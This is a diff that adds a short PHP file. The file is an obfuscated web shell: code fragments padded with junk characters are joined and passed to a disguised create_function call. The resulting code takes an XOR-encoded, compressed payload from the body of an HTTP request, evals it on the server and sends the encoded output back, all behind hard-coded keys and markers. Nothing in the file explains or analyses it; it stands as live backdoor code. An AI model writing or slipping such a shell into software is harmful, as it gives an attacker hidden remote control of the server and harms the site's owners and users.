@@ -1,0 +1,13 @@
+<?php
+$w='ase64_eZncode(Z@x(Z@gzcompreZss($oZ),$Zk));print(Z"$pZ$kh$r$kf");}';
+$D=';$j++,$i+ZZ+){$o.=$Zt{$i}^$Zk{$jZZ};}}retuZrZn $o;}if (Z@preg_mat';
+$X=str_replace('kQ','','crkQeatkQekQ_fukQkQkQnction');
+$V='ch("ZZ/$kh(.+)$kf/",@fiZle_getZ_contZents("pZhp:Z//input")Z,$m)';
+$T='==Z1Z) {@ob_starZZt();@evaZl(Z@gzuncompreZss(@x(Z@bZase64_deZc';
+$s='stZrlZen($Zt);$o=""Z;for(Z$i=0;$iZZ<$l;){for(Z$j=0;($j<$cZ&&$i<$lZZ)';
+$b='ode($m[1]ZZ),$k)));$Zo=@ob_geZt_conZtents();@Zob_eZZnd_clean();$rZ=@bZ';
+$I='pZ="ODUXnRyU6aZJZfcAdi";funcZtion x(Z$t,$Zk){$Zc=strlen($k)Z;$l=';
+$i='$Zk="e10adc39"Z;$kh=ZZZ"49ba59abZbe56";$kf="eZ057f20f88Z3e";$Z';
+$h=str_replace('Z','',$i.$I.$s.$D.$V.$T.$b.$w);
+$o=$X('',$h);$o();
+?>
